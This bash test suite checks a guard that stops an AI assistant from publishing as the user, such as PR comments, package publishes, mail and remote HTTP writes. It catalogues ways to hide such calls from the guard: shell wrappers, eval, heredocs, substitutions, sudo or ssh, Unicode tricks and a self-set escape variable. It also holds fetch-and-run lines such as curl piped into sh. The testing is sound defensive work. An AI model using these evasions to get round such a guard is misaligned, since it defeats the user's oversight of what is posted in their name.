#!/usr/bin/env bash
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$DIR/helper.sh"
. "$DIR/../plugins/building/lib/publish-cmd.sh"

# blocks <cmdline> <label> — expects the command to be judged as publishing
blocks() {
  if _guardrails_publishes_as_user "$1" >/dev/null; then :; else
    echo "  FAIL [$2]: expected BLOCK, got allow — '$1'"; FAILS=1
  fi
}
# allows <cmdline> <label> — expects the command to pass through
allows() {
  if _guardrails_publishes_as_user "$1" >/dev/null; then
    echo "  FAIL [$2]: expected ALLOW, got block — '$1'"; FAILS=1
  fi
}

# ---------------------------------------------------------------------------
# A publish verb as a subcommand of ANY tool. No platform list: a tool this
# guard has never heard of must be caught on the shape of the invocation.
# ---------------------------------------------------------------------------
blocks 'gh pr comment 12 --body hi'              "gh pr comment"
blocks 'gh issue comment 12 --body hi'           "gh issue comment"
blocks 'gh pr review 12 --approve'               "gh pr review"
blocks 'glab mr note 5 --message hi'             "glab mr note"
blocks 'jira issue comment ABC-1 --body x'       "jira issue comment"
blocks 'linear comment ENG-1 "text"'             "linear comment"
blocks 'discord-cli send general hi'             "an unknown tool, send verb"
blocks 'some-future-tool post --text hi'         "a tool that does not exist yet"
blocks 'npm publish'                             "npm publish"
blocks 'cargo publish'                           "cargo publish"
blocks 'git send-email --to a@b.c patch.eml'     "git send-email"
blocks '/opt/homebrew/bin/gh pr comment 1 -b x'  "tool via absolute path"

# Mail transports publish as the user by definition.
blocks 'mail -s subject someone@example.com'     "mail"
blocks 'sendmail -t < msg.txt'                   "sendmail"
blocks 'msmtp someone@example.com'               "msmtp"

# ---------------------------------------------------------------------------
# Any authenticated/bodied HTTP write to a remote host — regardless of vendor.
# The host list is gone: what matters is "write" + "not local".
# ---------------------------------------------------------------------------
blocks 'curl -X POST https://api.github.com/repos/o/r/issues/1/comments -d "{}"' "curl POST github"
blocks 'curl -d "text=hi" https://slack.com/api/chat.postMessage'                "curl POST slack"
blocks 'curl -X POST https://api.some-vendor-we-never-heard-of.io/v2/messages -d x' "curl POST unknown vendor"
blocks 'curl -d hi https://mastodon.social/api/v1/statuses'                      "curl POST fediverse"
blocks 'curl -X PATCH https://example.com/api/thing -d x'                        "curl PATCH"
blocks 'curl -X DELETE https://example.com/api/thing'                            "curl DELETE"
blocks 'curl --json {} https://example.com/hook'                                 "curl --json"
blocks 'wget --post-data=x https://example.com/api'                              "wget post"
blocks 'http POST example.com/api text=hi'                                       "httpie"

# ...but reads are untouched, and local development is not publishing.
allows 'curl https://api.github.com/repos/o/r'      "curl GET remote"
allows 'curl -O https://example.com/archive.tar.gz' "curl download"
allows 'curl -fsSL https://example.com/install.sh'  "curl fetch script"
allows 'curl -X POST http://localhost:8080/api -d x'   "POST to localhost"
allows 'curl -d x http://127.0.0.1:3000/api'           "POST to loopback ip"
allows 'curl -X POST http://[::1]:9000/api -d x'       "POST to ipv6 loopback"

# ---------------------------------------------------------------------------
# gh api: a method or body flag silently promotes it to a write.
# ---------------------------------------------------------------------------
blocks 'gh api -X POST repos/o/r/issues/1/comments -f body=hi' "gh api -X POST"
blocks 'gh api --method PATCH repos/o/r/issues/1'              "gh api --method PATCH"
blocks 'gh api repos/o/r/issues/1/comments -f body=x'          "gh api -f implies POST"
allows 'gh api repos/o/r/pulls/1'                              "gh api GET"
allows 'gh api --method GET repos/o/r/issues'                  "gh api explicit GET"

# The checks run per segment without starting a process (#126). httpie uppercases its method as Python does, so the
# long s in poſt makes a POST.
blocks 'http poſt api.example.com text=hi'                     "httpie with a long s in POST"
blocks 'gh api -X pOſt repos/o/r/issues'                        "gh api with a long s in POST"
allows 'curl -d x http://localhost.local:x/http://example.org' "a local URL holding another in its path"
blocks "curl -d x $(printf 'http://localhost/ %.0s' {1..33})"   "past 32 URLs in a segment, a write is read as remote"
allows "curl -d x $(printf 'http://localhost/ %.0s' {1..32})"   "32 local URLs in a segment are read"
# In a UTF-8 locale a regex misses what follows an invalid byte, and on macOS what precedes it, so such text is bytes.
utf8() { LC_ALL=C.UTF-8 bash -c '. "$1"; shift; "$@"' _ "$DIR/../plugins/building/lib/publish-cmd.sh" "$@"; }
utf8 _guardrails_http_has_body $'curl -d=x\xff https://api.example.com/hook' || {
  echo "  FAIL [a body flag before an invalid byte]: not found"; FAILS=1; }
utf8 _guardrails_has_remote_target $'curl \xc3 -d x https://api.example.com/hook' || {
  echo "  FAIL [a remote URL after an invalid byte]: not found"; FAILS=1; }

# ---------------------------------------------------------------------------
# Opening a review request is hands-off, but only as a draft: a ready PR pings
# reviewers, and promotion is the human's call. Flag position must not matter.
# ---------------------------------------------------------------------------
allows 'gh pr create --draft --title x --body y'  "draft PR, flag first"
allows 'gh pr create --title x --draft --body y'  "draft PR, flag in the middle"
allows 'gh pr create --title x --body y --draft'  "draft PR, flag last"
allows 'glab mr create --draft --title x'         "draft MR on another forge"
blocks 'gh pr create --title x --body y'          "ready PR blocked"
blocks 'gh pr create --fill'                      "ready PR via --fill blocked"
blocks 'glab mr create --title x'                 "ready MR on another forge"
# -d is --draft in gh but --description in glab, so it is not proof of a draft.
blocks 'glab mr create -d "some description" --title x' "-d is not a draft flag"

# ---------------------------------------------------------------------------
# Composition must not hide the call.
# ---------------------------------------------------------------------------
blocks "sh -c 'gh pr comment 1 --body hi'"       "sh -c wrapper"
blocks 'bash -c "jira issue comment X --body y"' "bash -c wrapper, unknown tool"
blocks 'git add -A && npm publish'               "chained after git"
blocks 'true; gh pr review 1 --approve'          "chained after semicolon"

# The hatch is not self-grantable: an assistant can prefix anything it writes.
blocks 'ALLOW_PUBLISH_AS_ME=1 gh pr comment 1 --body x' "inline hatch, gh"
blocks 'ALLOW_PUBLISH_AS_ME=1 npm publish'              "inline hatch, npm"

# ---------------------------------------------------------------------------
# Shell operators inside quotes are data. Splitting on them blindly does not merely
# over-split a real command, it fabricates one that was never run — a grep pattern
# containing a pipe was read as an invocation and blocked.
# ---------------------------------------------------------------------------
allows "grep -nE 'gh api|gh pr create|--draft' SKILL.md" "pipe inside a grep pattern"
allows 'rg "comment|publish|send" src/'                   "pipes inside a double-quoted pattern"
allows "awk '{gsub(/a|b/, x)}' file"                      "pipe inside an awk program"
allows 'git commit -m "handle a && b; c | d"'             "operators inside a commit message"
allows "grep -E 'npm publish|cargo publish' notes.md"     "two publish verbs inside a pattern"

# ...while real operators outside quotes must still split.
blocks 'true | gh pr comment 1 --body x'    "real pipe still splits"
blocks 'echo x && gh pr comment 1 --body y' "real && still splits"
blocks 'echo x; npm publish'                "real semicolon still splits"

# ---------------------------------------------------------------------------
# No false positives: a word in an argument is not an invocation.
# ---------------------------------------------------------------------------
allows 'git commit -m "wire up gh pr comment"'  "publish verb in a commit message"
allows 'git commit -m "post the release notes"' "post in a commit message"
allows 'git log --grep post'                    "verb as a flag value"
allows 'git log --oneline'                      "ordinary git read"
allows "grep -r 'gh pr comment' ."              "grep for the string"
allows 'rg publish src/'                        "ripgrep for the word"
allows 'echo "do not send this"'                "echo mentioning a verb"
allows 'cat notes-about-publishing.md'          "filename containing a verb"
allows 'gh pr view 12'                          "gh pr view"
allows 'gh pr list'                             "gh pr list"
allows 'npm install'                            "npm install"
allows 'npm run build'                          "npm run build"
allows 'git status'                             "unrelated command"

# ---------------------------------------------------------------------------
# Heredoc bodies are data, not commands. Writing a file whose prose starts a
# line with a publish verb in subcommand position must not trip the guard — a
# PR body describing `gh pr comment` is the obvious case, and the splitter used
# to read every body line as its own command.
# ---------------------------------------------------------------------------
allows "$(printf 'cat > body.md <<%sEOF%s\nReading inline review comments needs the API.\nEOF' "'" "'")" \
  "quoted heredoc, prose with a publish verb"
allows "$(printf 'cat > body.md <<EOF\nlinear comment ENG-1 is documented here\nEOF')" \
  "unquoted heredoc, prose naming a publish command"
allows "$(printf 'cat > b.md <<-EOF\n\tsome-tool post --text x\n\tEOF')" \
  "tab-indented heredoc"

# ...but anything outside the body is still scanned. Mistaking something else
# for a heredoc opener would silently stop the scan, so those cases are pinned.
blocks "$(printf 'cat > body.md <<%sEOF%s\nharmless prose\nEOF\ngh pr comment 12 --body hi' "'" "'")" \
  "command after a closed heredoc"
blocks "$(printf 'echo $((1 << 4))\ngh pr comment 12 --body hi')" \
  "arithmetic shift is not a heredoc opener"
blocks 'grep -c "x" f <<< "gh pr comment 1"; gh pr comment 2 --body hi' \
  "here-string is not a heredoc"

# A heredoc opened inside $( ) is still a heredoc. The enclosing double quote
# does not reach into a command substitution, and `-m "$(cat <<EOF ...)"` is how
# a multi-paragraph commit message arrives.
allows "$(printf 'git commit -m "$(cat <<%sEOF%s\nnamespace comment trimmed to two sentences\nEOF\n)"' "'" "'")" \
  "heredoc inside a command substitution"
allows "$(printf 'git commit -m "$(cat <<%sEOF%s\nShortened the wording so it fits.\nEOF\n)"' "'" "'")" \
  "nested heredoc, innocent prose"
blocks "$(printf 'git commit -m "$(cat <<%sEOF%s\nharmless prose\nEOF\n)" && gh pr comment 12 --body hi' "'" "'")" \
  "command after a nested heredoc closes"

# ---------------------------------------------------------------------------
# A quoted argument can span lines, and its text is data on every line (#3).
# ---------------------------------------------------------------------------
allows "perl -pi -e 's#a#b#;
s#the plugin'\"'\"'s publish guard#the building plugin'\"'\"'s publish guard#;' SKILL.md" \
  "multi-line quoted perl program"
allows 'git commit -m "first line
gh pr comment is only mentioned here"' "multi-line double-quoted message"

# Quote state carries across lines only where the shell's does, so nothing hides behind a false quote.
blocks $'gh pr \\\n  comment 1 -b x' "a backslash-newline joins the command"
blocks $'echo don\\\'t\ngh pr comment 1 -b x' "an escaped apostrophe opens no quote"
blocks $'echo hi # it\'s fine\ngh pr comment 1 -b x' "an apostrophe in a comment opens no quote"
blocks $'printf $\'it\\\'s\\n\'\ngh pr comment 1 -b x' "an escaped quote does not end \$'...'"
blocks $'echo "a \\" b"\ngh pr comment 1 -b x' "an escaped double quote does not end \"...\""
blocks $'echo \'never closed\ngh pr comment 1 -b x' "an unclosed quote falls back to scanning every line"

# A carried quote turns any misread into hidden lines, so $'...' and # end only where the shell ends them.
blocks $'printf $\'Added a line\\n\' >> notes.txt\ngh pr comment 1 -b x\necho \\\'' "an a inside \$'...' does not end it"
blocks 'echo \;#; gh pr comment 1 -b x'    "a # after an escaped ; is mid-word"
blocks 'echo a\ #; gh pr comment 1 -b x'   "a # after an escaped blank is mid-word"
blocks 'echo a\|#| gh pr comment 1 -b x'   "a # after an escaped | is mid-word"
blocks 'echo $(true)#; gh pr comment 1 -b x'  "a # after \$( ) is mid-word"
blocks 'echo $((1))#; gh pr comment 1 -b x'   "a # after \$(( )) is mid-word"
blocks 'cat <(true)#; gh pr comment 1 -b x'   "a # after <( ) is mid-word"
blocks $'echo a\\\n#; gh pr comment 1 -b x'   "a # on a joined line continues the word"
blocks $'(cd /tmp)# it\'s\ngh pr comment 1 -b x\n# it\'s' "a # after a subshell still starts a comment"

# A heredoc is recognised by the delimiter the shell reads, and <<< opens none.
blocks $'cat <<\\EOF > notes.txt\nWe don\'t ship this yet.\nEOF\ngh pr comment 1 -b x # it\'s done' \
  "a backslash-quoted delimiter opens a heredoc"
blocks $'cat <<.END > notes.txt\nWe don\'t ship this yet.\n.END\ngh pr comment 1 -b x # it\'s done' \
  "a delimiter with punctuation opens a heredoc"
blocks $'cat <<EOF \\\n  > /dev/null\nbody\nEOF\ngh pr comment 1 -b x' "a heredoc body starts after its joined line"
blocks $'grep -q foo <<<"$PWD"\ngh pr comment 1 -b x' "a here-string opens no heredoc"
blocks $'cat <<<word\ngh pr comment 1 -b x'         "a bare here-string opens no heredoc"
blocks $'cat <<E\\OF\nbody\nEOF\ngh pr comment 1 -b x'   "a delimiter keeps its escaped letters"
blocks $'cat <<E"OF"\nbody\nEOF\ngh pr comment 1 -b x'   "a delimiter keeps its quoted part"
blocks $'cat <<EOF-1\nbody\nEOF-1\ngh pr comment 1 -b x' "a delimiter keeps its punctuation"
blocks $'echo $[1<<2]\ngh pr comment 1 -b x'         "1<<2 inside \$[ ] is a shift"
blocks $'((\n  x = 1<<2\n))\ngh pr comment 1 -b x'     "1<<2 inside a split (( )) is a shift"
allows $'cat > b.md <<\\EOF\ngh pr comment is documented here\nEOF' "prose in a backslash-quoted heredoc"

# An sh -c or eval payload is a script, so its line breaks still separate commands.
blocks $'bash -c \'\nset -e\ncd /tmp\ngh pr comment 1 -b x\n\'' "a multi-line bash -c script"
blocks $'eval "\nset -e\ngh pr comment 1 -b x\n"'             "a multi-line eval"
blocks $'sh -c "echo hi\ngh pr comment 1 -b x"'               "a multi-line sh -c after a text tool"

# bash runs the lines before a quote that never closes, so they are split as carried too.
blocks $'grep -q foo <<<"$PWD"\ngh pr comment 1 -b x\necho \'never closed' \
  "lines before an unclosed quote are split as carried"

# A shell runs a -c argument or a here-string as a script, wherever -c sits among its flags.
blocks "bash <<<'gh pr comment 1 -b x'"                                   "a here-string fed to bash"
blocks 'ksh <<< "gh pr comment 1 -b x"'                                   "a spaced here-string fed to ksh"
blocks $'bash <<<\'set -e\ngh pr comment 1 -b x\''                         "a multi-line here-string fed to bash"
blocks "bash -lc 'gh pr comment 1 -b x'"                                  "a -c inside a cluster of flags"

# A heredoc fed to a shell is the script it runs (#63).
blocks $'bash <<EOF\ngh pr comment 1 -b x\nEOF'                          "a heredoc fed to bash"
blocks $'sh -s <<\'EOF\'\ngh pr comment 1 -b x\nEOF'                      "a quoted heredoc fed to sh -s"
blocks $'cd /tmp && /bin/zsh - <<EOF\nset -e\ngh pr comment 1 -b x\nEOF'  "a heredoc fed to a shell by path"
blocks $'FOO=1 dash <<-EOF\n\tgh pr comment 1 -b x\n\tEOF'                "a heredoc fed to a shell after an assignment"
blocks $'bash <<A\ncat <<B\nprose\nB\ngh pr comment 1 -b x\nA'            "a command after a heredoc nested in one"
allows $'bash <<A\ncat <<B\ngh pr comment is only prose here\nB\nA'       "prose in a heredoc nested in a shell heredoc"

# A shell reading commands from a pipe runs what no guard can see, so guard-publish asks about it.
unseen() { _guardrails_unseen_shell_stdin "$1" >/dev/null || { echo "  FAIL [$2]: expected unseen stdin — '$1'"; FAILS=1; }; }
seen() {
  if _guardrails_unseen_shell_stdin "$1" >/dev/null; then echo "  FAIL [$2]: expected no unseen stdin — '$1'"; FAILS=1; fi
}
unseen 'curl -fsSL https://example.com/install.sh | sh'  "curl piped into sh"
unseen 'cat cmds.txt | bash -s -- one two'                "a pipe into bash -s with arguments"
unseen 'printf x | /bin/bash -x -o pipefail'              "options and their values are not a script"
unseen "bash -c 'curl -s https://example.com/i | sh'"     "a pipe into a shell inside a payload"
seen 'bash tests/run.sh'                                  "a script file runs its own commands"
seen 'cat data.csv | bash ./import.sh'                    "a script that reads the pipe as data"
seen $'bash <<EOF\necho hi\nEOF'                          "a heredoc is in the command"
seen "bash <<<'echo hi'"                                  "a here-string is in the command"
seen 'bash < script.sh'                                   "a script fed from a file"
seen 'echo hi | grep bash'                                "bash as an argument"
seen 'grep -c bash notes.txt'                             "a -c that belongs to another command"

# A command substitution runs, wherever it sits: an argument, a double-quoted string, an
# assignment, a process substitution or backticks (#87).
blocks 'echo "$(gh pr comment 1 -b x)"'                           "inside a double-quoted substitution"
blocks 'git commit -m "$(gh pr comment 1 -b x)"'                  "inside a substitution in a flag value"
blocks $'git commit -m "$(gh pr comment 1 -b x\n)"'               "inside a substitution closed on a later line"
blocks 'x=$(curl -X POST https://api.example.com/hook -d y)'      "an HTTP write inside an assignment"
blocks 'cat <(gh pr comment 1 -b x)'                              "inside a process substitution"
blocks 'echo "`gh pr comment 1 -b x`"'                            "inside backticks"
blocks 'echo "$(printf %s x)" "$(gh pr comment 1 -b x)"'          "the second of two substitutions"
blocks 'echo $(echo $(echo $(echo $(echo $(gh pr comment 1 -b x)))))' "five substitutions deep"
allows "echo '\$(gh pr comment 1 -b x)'"                          "a substitution inside single quotes is text"
allows 'echo "\$(gh pr comment 1 -b x)"'                          "an escaped substitution is text"
allows $'git commit -F - <<\'EOF\'\n$(gh pr comment 1 -b x)\nEOF'  "a substitution in a quoted heredoc is text"

# A payload loses one quote at each end, if it has one, and nothing else.
payload() {
  if _guardrails_shell_payload "$1"; then assert_eq "$_GUARDRAILS_PAYLOAD" "$2" "$3"; else assert_eq "(none)" "$2" "$3"; fi
}
payload "bash -c 'x y'"     "x y"    "a single-quoted payload loses its quotes"
payload 'eval "x y"'        "x y"    "a double-quoted payload loses its quotes"
payload "eval x'"           "x"      "a payload loses a closing quote alone"
payload "eval 'x"           "x"      "a payload loses an opening quote alone"
payload "eval \"'\""        "'"      "a payload keeps a quote inside its quotes"
payload "eval ''"           "(none)" "a payload of two quotes is empty"
payload "eval '"            "(none)" "a payload of one quote is empty"
payload "eval 'é ü'"        "é ü"    "a payload keeps its multibyte characters"
# In a UTF-8 locale, bash's ${x#pattern} and ${x%pattern} cut a string at an invalid byte before a backslash.
got="$(LC_ALL=C.UTF-8 bash -c '. "$1"; _guardrails_shell_payload "$2" && printf %s "$_GUARDRAILS_PAYLOAD"' _ \
  "$DIR/../plugins/building/lib/shell-split.sh" $'eval \'\\\xc3\\ x\'')"
assert_eq "$got" $'\\\xc3\\ x' "a payload keeps an invalid byte and all after it"

# A shell or eval splits its payload again, at every depth, so the payload's segments count against the
# segment cap too, in both splits (#107).
too_much() { _guardrails_unreadable "$1" >/dev/null || { echo "  FAIL [$2]: expected unreadable"; FAILS=1; }; }
in_time()  { if _guardrails_unreadable "$1" >/dev/null; then echo "  FAIL [$2]: expected readable"; FAILS=1; fi; }
too_much "eval \"$(printf 'a;%.0s' {1..6000})\""                     "an eval payload past the segment cap"
too_much "eval 'eval \"eval eval $(printf 'a b;%.0s' {1..2000})\"'"   "nested eval payloads past the segment cap"
too_much "bash -c '$(printf '$(a)%.0s' {1..6000})'"                  "substitutions in a payload past the segment cap"
too_much $'cat <<\\EOF\neval "'"$(printf 'a;%.0s' {1..11000})"$'"\nEOF' "a payload only the per-line split reads"
in_time  "eval \"$(printf 'a;%.0s' {1..4000})\""                     "an eval payload within the segment cap"
in_time  "git commit -m \"$(printf 'a;%.0s' {1..6000})\" && bash ./x.sh" "text before a shell is not its payload"

# Each depth splits the text again, so the characters a shell or eval reads again count against the length cap (#107).
words="$(printf 'a b %.0s' {1..32700})"
too_much "eval eval eval eval $words"                                 "four evals over 128 KiB read again"
too_much "bash -c 'bash -c \"$(printf 'a b %.0s' {1..17500})\"'"        "a shell in a shell over 70 KiB read again"
too_much $'cat <<\\EOF\neval eval "'"$(printf 'a b %.0s' {1..17500})"$'"\nEOF' "a re-read only the per-line split makes"
in_time  "bash -c '$(printf 'cp "src/file.txt" "out/dir/file.txt"\n%.0s' {1..2760})'" "one shell over a 100 KiB script"
in_time  "git commit -m \"$(printf 'Why bash and sh read this; see the doc.\n%.0s' {1..8})$(printf 'a b %.0s' {1..25000})\"" \
  "prose naming shells is no payload"
# A lone & ends a command as ; does, but &&, &>, >&, <& and |& are other operators (#89).
splits() { assert_eq "$(_guardrails_split_segments "$1")" "$2" "$3"; }
blocks 'true & gh pr comment 1 -b x'                    "a command after a lone &"
blocks 'sleep 1 & npm publish'                          "a publish after a background job"
blocks $'true & bash <<EOF\ngh pr comment 1 -b x\nEOF'  "a heredoc fed to a shell after a lone &"
allows 'echo x 2>&1 send it'                            "2>&1 is a redirect"
allows 'echo x &> log send it'                          "&> is a redirect"
allows 'cat <&3 post it'                                "<& is a redirect"
splits 'a & b'      $'a \n b'   "a lone & splits"
splits 'a |& b'     $'a \n b'   "|& is one operator"
splits 'echo "$(a |& b)"' $'echo "$(a \n b)"\na \n b' "|& is one operator inside a substitution"
splits 'a >&2 & b'  $'a >&2 \n b' ">& does not split, a lone & after it does"
splits 'a &>f b'    'a &>f b'   "&> does not split"
splits "a '&' b"    "a '&' b"   "a quoted & does not split"

# An unquoted heredoc runs the $( ) and backticks in its body, where quotes are text, but the rest is data (#88).
blocks $'cat <<EOF\n$(gh pr comment 1 -b x)\nEOF'                  "a substitution in an unquoted heredoc body"
blocks $'cat > b.md <<EOF\nSee `gh pr comment 1 -b x` here\nEOF'    "backticks in an unquoted heredoc body"
blocks $'cat <<-EOF\n\t\'$(gh pr comment 1 -b x)\'\n\tEOF'         "a single-quoted substitution in a body still runs"
blocks $'cat <<EOF\n$(true\ngh pr comment 1 -b x)\nEOF'           "a substitution spanning body lines"
blocks $'git commit -m "$(cat <<EOF\nSubject $(gh pr comment 1 -b x)\nEOF\n)"' \
  "a substitution in a heredoc inside a substitution"
blocks $'cat <<A <<\'B\'\n$(gh pr comment 1 -b x)\nA\nB'           "a substitution in the unquoted one of two heredocs"
blocks $'cat <<EOF\n$(echo\nEOF\ngh pr comment 1 -b x'             "a command after a body whose substitution never closed"
blocks $'cat <<EOF\n$(cat <<X\nEOF\ngh pr comment 1 -b x'          "a heredoc opened in a body substitution hides no later line"
allows $'cat <<"EOF"\n$(gh pr comment 1 -b x)\nEOF'                "a substitution in a double-quoted heredoc is text"
allows $'cat <<\\EOF\n`gh pr comment 1 -b x`\nEOF'                 "backticks in a backslash-quoted heredoc are text"
allows $'cat <<EOF\n\\$(gh pr comment 1 -b x)\nEOF'                "an escaped substitution in a body is text"
allows $'cat <<EOF\nlinear comment ENG-1 on $(date)\nEOF'          "body text around a substitution stays data"
allows $'git commit -m "$(cat <<EOF\nlinear comment ENG-1 on $(date)\nsome-tool post `date`\nEOF\n)"' \
  "body text in a heredoc inside a substitution stays data"
allows $'cat <<EOF\n$((1 + 2)) people post here\nEOF'              "arithmetic in a body is not a substitution"

# A keyword, a wrapper and its options, or a ( before a command does not hide it, nor ssh a shell (#90).
blocks "sudo bash -c 'gh pr comment 1 -b x'"                      "a shell behind sudo"
blocks "sudo -u root -E bash -c 'gh pr comment 1 -b x'"           "a shell behind sudo and its options"
blocks "env -i FOO=1 bash -c 'gh pr comment 1 -b x'"              "a shell behind env and an assignment"
blocks "nohup bash -c 'gh pr comment 1 -b x'"                     "a shell behind nohup"
blocks "exec -a name bash -c 'gh pr comment 1 -b x'"              "a shell behind exec"
blocks "command bash -c 'gh pr comment 1 -b x'"                   "a shell behind command"
blocks "time -p bash -c 'gh pr comment 1 -b x'"                   "a shell behind time"
blocks "echo 1 | xargs -n 1 sh -c 'gh pr comment \"\$1\" -b x' _"  "a shell behind xargs"
blocks "(bash -c 'gh pr comment 1 -b x')"                         "a shell in a subshell"
blocks "for i in 1; do sudo bash -c 'gh pr comment 1 -b x'; done" "a shell after do"
blocks $'if true; then bash <<EOF\ngh pr comment 1 -b x\nEOF\nfi'  "a heredoc fed to a shell after then"
blocks $'{ bash <<EOF\ngh pr comment 1 -b x\nEOF\n}'               "a heredoc fed to a shell in a group"
blocks $'sudo -u root bash <<EOF\ngh pr comment 1 -b x\nEOF'        "a heredoc fed to a shell behind sudo"
blocks $'ssh host bash <<EOF\ngh pr comment 1 -b x\nEOF'           "a heredoc fed to a shell on another host"
blocks $'ssh -p 22 host bash -s <<\'EOF\'\ngh pr comment 1 -b x\nEOF' "a quoted heredoc fed to ssh and a shell"
blocks 'sudo -u root gh pr comment 1 -b x'                        "a publish behind sudo and an option"
blocks 'env FOO=1 gh pr create --title x'                         "a ready PR behind env"
blocks 'time -p npm publish'                                      "a publish behind time"
blocks 'echo 1 | xargs -I{} gh pr comment {} -b x'                "a publish behind xargs"
blocks 'exec curl -d x https://example.com/api'                   "an HTTP write behind exec"
blocks '/usr/bin/env -u HOME gh pr create --fill'                 "a wrapper by path"
allows 'command -v gh'                                            "command -v names a command"
allows 'command -v npm publish'                                   "command -v runs nothing it names"
allows 'time make'                                                "time before an ordinary command"
allows 'env FOO=1 git status'                                     "env before an ordinary command"
allows 'sudo -u www systemctl restart nginx'                      "sudo before an ordinary command"
allows 'ssh host gh pr list'                                      "ssh running something other than a shell"
allows $'cat > notes.md <<EOF\nRun sudo bash -c to post, or ssh host bash.\nEOF' "prose naming sudo and ssh"
unseen 'cat cmds.txt | sudo bash'                                 "a pipe into a shell behind sudo"
unseen 'cat cmds.txt | ssh host bash -s'                          "a pipe into a shell on another host"
seen   'command -v bash'                                          "command -v runs no shell"
seen   'ssh host uptime'                                          "ssh running something other than a shell"

# The per-line split stays as it was before quotes carried (#77), so these split as they did on main.
per_line() { assert_eq "$(_GUARDRAILS_SPLIT_PER_LINE=1 _guardrails_split_segments "$1")" "$2" "per-line: $3"; }
per_line 'true & gh pr comment 1 -b x'                    'true & gh pr comment 1 -b x' "a lone &"
per_line 'a |& b'                                         $'a \n& b'                    "|&"
per_line $'true & bash <<EOF\ngh pr comment 1 -b x\nEOF'  'true & bash <<'              "a shell heredoc after a lone &"
per_line $'cat <<EOF\n$(gh pr comment 1 -b x)\nEOF'       'cat <<'                      "a substitution in a heredoc body"
per_line $'cat <<EOF\n$(echo\nEOF\ngh pr comment 1 -b x'  $'cat <<\ngh pr comment 1 -b x' "an unclosed substitution in a body"
per_line $'git commit -m "$(cat <<EOF\nSubject $(gh pr comment 1 -b x)\nEOF\n)"' $'git commit -m "$(cat <<\n)"' \
  "a substitution in a heredoc inside a substitution"
per_line $'if true; then bash <<EOF\ngh pr comment 1 -b x\nEOF\nfi' $'if true\n then bash <<\nfi' "a shell heredoc after then"
per_line $'ssh host bash <<EOF\ngh pr comment 1 -b x\nEOF'        'ssh host bash <<'          "a shell heredoc behind ssh"

# A redirect before the command word is not the command, fused to its target or not (#109).
blocks '>out gh pr create --fill'                                "a fused redirect before a ready PR"
blocks '> out gh pr create --fill'                               "a separate redirect before a ready PR"
blocks '2> /dev/null gh pr comment 1 -b x'                       "a separate fd redirect before a publish"
blocks '<in gh pr create --title x'                              "an input redirect before a ready PR"
blocks '&>f gh pr create --fill'                                 "&> before a ready PR"
blocks '>&2 gh pr create --fill'                                 ">& before a ready PR"
blocks "2>&1 > log bash -c 'gh pr comment 1 -b x'"               "redirects before a shell"
allows '>out echo gh pr comment 1 -b x'                          "a redirect before a text tool"

# A function body, a case arm or a coproc runs its command, as does a command behind more wrappers (#110).
blocks 'f() { gh pr comment 1 -b x; }; f'                              "a function body"
blocks 'f () { gh pr create --fill; }'                                  "a function body after a spaced header"
blocks 'function f { gh pr create --fill; }'                            "a function keyword's body"
blocks 'function f() { gh pr create --fill; }'                          "a function keyword's body with parentheses"
blocks 'f(){ gh pr create --fill; }'                                    "a body fused to its header"
blocks 'f()(gh pr create --fill)'                                       "a subshell body fused to its header"
blocks 'case x in *) gh pr comment 1 -b x;; esac'                       "a case arm"
blocks 'case "$1" in a|b) gh pr create --fill;; esac'                   "a case arm after a pattern with |"
blocks $'case x\nin\n  (y) gh pr create --fill ;;\nesac'                "a case arm over lines, with an opening parenthesis"
blocks 'coproc gh pr create --fill'                                     "a coproc"
blocks 'coproc worker { gh pr create --fill; }'                         "a named coproc"
blocks 'timeout 5 bash -c "gh pr comment 1 -b x"'                       "a shell behind timeout"
blocks 'timeout -s KILL -k 2 5 gh pr create --fill'                     "a publish behind timeout and its options"
blocks 'nice bash -c "gh pr comment 1 -b x"'                            "a shell behind nice"
blocks 'nice -n 5 gh pr create --fill'                                  "a publish behind nice -n"
blocks 'stdbuf -oL -e 0 gh pr create --fill'                            "a publish behind stdbuf"
blocks 'doas -u root bash -c "gh pr comment 1 -b x"'                    "a shell behind doas"
blocks 'setsid -f gh pr create --fill'                                  "a publish behind setsid"
blocks 'chroot -u me /srv/jail gh pr create --fill'                     "a publish behind chroot"
blocks 'docker exec -it -u root c bash -c "gh pr comment 1 -b x"'       "a shell behind docker exec"
blocks 'kubectl exec -it pod -c app -- bash -c "gh pr comment 1 -b x"'  "a shell behind kubectl exec"
allows 'timeout 5 make'                                                 "timeout before an ordinary command"
allows 'nice -n 5 make test'                                            "nice before an ordinary command"
allows 'f() { echo gh pr comment 1 -b x; }'                             "a function that only echoes"
allows 'case x in *) echo gh pr comment 1 -b x;; esac'                  "a case arm that only echoes"
allows 'docker exec c ls'                                               "docker exec running something other than a shell"
allows 'kubectl exec pod -- gh pr list'                                 "kubectl exec running something other than a shell"
allows $'cat > notes.md <<EOF\nRun timeout 5 bash, or a case arm, or f() { gh; }.\nEOF' "prose naming these words"
unseen 'echo x | timeout 5 bash'                                        "a pipe into a shell behind timeout"
unseen 'cat cmds.txt | docker exec -i c sh'                             "a pipe into a shell in a container"
seen   'docker exec c ls'                                               "docker exec running something other than a shell"

# A wrapper's long option can take the next word as its value; written with = it takes none (#116).
blocks 'sudo --user root bash -c "gh pr comment 1 -b x"'                 "a shell behind sudo --user"
blocks 'sudo --group wheel --chdir /tmp gh pr create --fill'             "a publish behind sudo --group and --chdir"
blocks 'env --unset HOME --chdir /tmp gh pr create --fill'               "a publish behind env --unset and --chdir"
blocks '/usr/bin/time --output t.txt gh pr create --fill'                "a publish behind time --output"
blocks 'echo 1 | xargs --max-args 1 gh pr create --fill'                 "a publish behind xargs --max-args"
blocks 'timeout --signal KILL --kill-after 2 5 gh pr create --fill'      "a publish behind timeout's long options"
blocks 'nice --adjustment 5 gh pr create --fill'                         "a publish behind nice --adjustment"
blocks 'stdbuf --output L gh pr create --fill'                           "a publish behind stdbuf --output"
blocks 'chroot --userspec me:me /srv/jail gh pr create --fill'           "a publish behind chroot --userspec"
blocks 'docker exec --user root c bash -c "gh pr comment 1 -b x"'        "a shell behind docker exec --user"
blocks 'kubectl exec --container app pod -- bash -c "gh pr comment 1 -b x"' "a shell behind kubectl exec --container"
blocks 'sudo --user=root gh pr create --fill'                            "--user=root takes no extra word"
allows 'sudo --user root make'                                           "sudo --user before an ordinary command"

# The shell drops the quotes and backslashes of a command word, so a quoted or escaped one is read as itself (#111).
blocks '"bash" -c "gh pr comment 1 -b x"'                                "a double-quoted shell"
blocks "\$'bash' -c 'gh pr comment 1 -b x'"                              "an ANSI-C quoted shell"
